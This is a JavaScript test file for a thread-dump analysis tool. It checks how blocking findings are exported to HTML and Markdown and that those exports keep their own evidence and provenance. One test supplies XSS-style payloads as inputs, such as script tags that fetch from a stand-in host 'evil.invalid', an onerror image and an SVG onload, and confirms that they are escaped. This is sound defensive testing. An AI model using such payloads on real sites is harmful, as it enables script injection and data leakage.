import assert from 'node:assert/strict';
import test from 'node:test';
import {analyzeThreadDumpData} from '../../assets/javautils/tda/analysis.js';
import {createBlockingFinding,reportHtml,reportMarkdown,inputDigest} from '../../assets/javautils/findings-report.js';
import {blockingSequence} from './blocking-fixture.js';

test('findings detach evidence, scope and origin from later dataset/model changes without default raw dumps',async()=>{
    const result=analyzeThreadDumpData(blockingSequence.map(text=>({text,name:'input.txt'})));
    const pattern=result.blockingPatterns.find(p=>p.title==='Dependencies on worker-1');
    const context={datasetRevision:1,filter:'blocked',inputSha256:await inputDigest([{text:blockingSequence.join('\n')}])};
    const f=createBlockingFinding({pattern,snapshotIndex:1,context});
    const exported=reportMarkdown([f]);
    pattern.observations[1].blocker.sourceLabel='new-dataset.txt';context.datasetRevision=99;
    assert.equal(reportMarkdown([f]),exported);
    assert.equal(f.observations.length,1);assert.equal(f.context.datasetRevision,1);
    assert.match(exported,/source snapshot/);assert.match(exported,/snapshot raw lines/);
    assert.match(exported,/not.*whole run/i);assert.match(exported,/full observed history/);
    assert.doesNotMatch(exported,/Full thread dump OpenJDK/);
    assert.equal(createBlockingFinding({pattern,snapshotIndex:1,context,allObservations:true}).observations.length,2);
    assert.throws(()=>createBlockingFinding({pattern,snapshotIndex:2,context}),/Choose a snapshot/);
});
test('hostile log text and notes cannot execute HTML or load resources in HTML or Markdown',()=>{
    const result=analyzeThreadDumpData(blockingSequence.join('\n'));
    const f=createBlockingFinding({pattern:result.blockingPatterns[0],snapshotIndex:1,context:{file:'<script>fetch("https://evil.invalid")</script>'}});
    f.notes='<img src="https://evil.invalid/leak" onerror="alert(1)">\n![x](https://evil.invalid)\n# counterfeit finding';
    f.title='</h2><iframe src="https://evil.invalid">';f.graphic='data:image/svg+xml,<svg onload="alert(1)">';
    f.observations[0].blocker.sourceLabel='</p><script>fetch("https://evil.invalid/source")</script>';
    const html=reportHtml([f]),md=reportMarkdown([f]);
    assert.doesNotMatch(html,/<script|<iframe|<img /i);assert.match(html,/default-src 'none'/);
    assert.match(html,/&lt;img/);assert.match(md,/\\!\\\[/);assert.match(md,/\\# counterfeit/);
    assert.doesNotMatch(md,/!\[x\]\(https:/);assert.match(html,/User notes/);
});

test('selected findings lead with readable scope and uncertainty while retaining full provenance and raw evidence',()=>{
    const result=analyzeThreadDumpData(blockingSequence.map(text=>({text,name:'selected-source.txt'})));
    const context={datasetRevision:1,sources:[{name:'selected-source.txt',kind:'file',id:1},{name:'other-source.txt',kind:'file',id:2}],
        inputSha256:'a'.repeat(64),tableFilters:{blocked:true},graphPresentation:{filter:'selected pattern'}};
    const f=createBlockingFinding({pattern:result.blockingPatterns[0],snapshotIndex:1,context});
    f.notes='My own observation';
    for(const exported of [reportHtml([f]),reportMarkdown([f])]) {
        const position=name=>exported.indexOf(exported.startsWith('<!doctype') ? `<h3>${name}</h3>` : `### ${name}\n`);
        assert.ok(position('Sources') < position('Scope'));
        assert.ok(position('Scope') < position('Observation'));
        assert.ok(position('Uncertainty / conflicting evidence') < position('Input origin'));
        assert.ok(position('Raw references (snapshot-local lines)') < position('Input origin'));
        assert.match(exported,/snapshot raw lines/);
        assert.ok(exported.includes(context.inputSha256));
        assert.match(exported,/other-source.txt/); // Whole recorded context is retained, not silently filtered.
        assert.match(exported,/graphPresentation/);
        assert.match(exported,/My own observation/);
        assert.match(exported,/Analysis version/);
    }
    const html=reportHtml([f]);
    assert.match(html,/<details class="metadata"><summary>/); // Closed by default; raw evidence remains outside.
    assert.doesNotMatch(html,/<details[^>]*\bopen\b/);
    assert.match(html,/class="field">selected-source.txt/);
    assert.match(reportMarkdown([f]),/### Sources\n\nselected-source.txt/);
    assert.equal(f.context.sources.length,2);
});
